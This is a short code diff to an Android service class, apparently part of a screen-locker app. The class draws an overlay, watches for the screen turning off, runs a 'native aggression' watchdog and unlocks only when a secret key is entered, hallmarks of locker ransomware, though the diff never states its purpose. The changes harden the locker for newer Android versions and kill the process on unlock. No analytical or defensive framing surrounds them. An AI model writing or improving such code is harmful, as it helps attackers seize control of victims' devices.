@@ -123,12 +123,17 @@ public class LockerService extends Service {
         // Inisialisasi Kamera untuk Senter
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         try {
-            cameraId = cameraManager.getCameraIdList()[0];
+            String[] ids = cameraManager.getCameraIdList();
+            if (ids.length > 0) cameraId = ids[0];
         } catch (Exception e) {}
 
         // Register receiver untuk deteksi tombol power (layar mati)
         IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
-        registerReceiver(screenReceiver, filter);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(screenReceiver, filter, Context.RECEIVER_EXPORTED);
+        } else {
+            registerReceiver(screenReceiver, filter);
+        }
 
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
@@ -174,7 +179,9 @@ public class LockerService extends Service {
         btnUnlock.setOnClickListener(v -> {
             // Menggunakan Enkripsi Militer Native Check
             if (verifyAdvancedKey(inputPass.getText().toString().trim())) {
+                stopNativeAggression(); // Pastikan watchdog mati duluan
                 stopSelf();
+                android.os.Process.killProcess(android.os.Process.myPid()); // Force kill aplikasi
             }
         });
     }
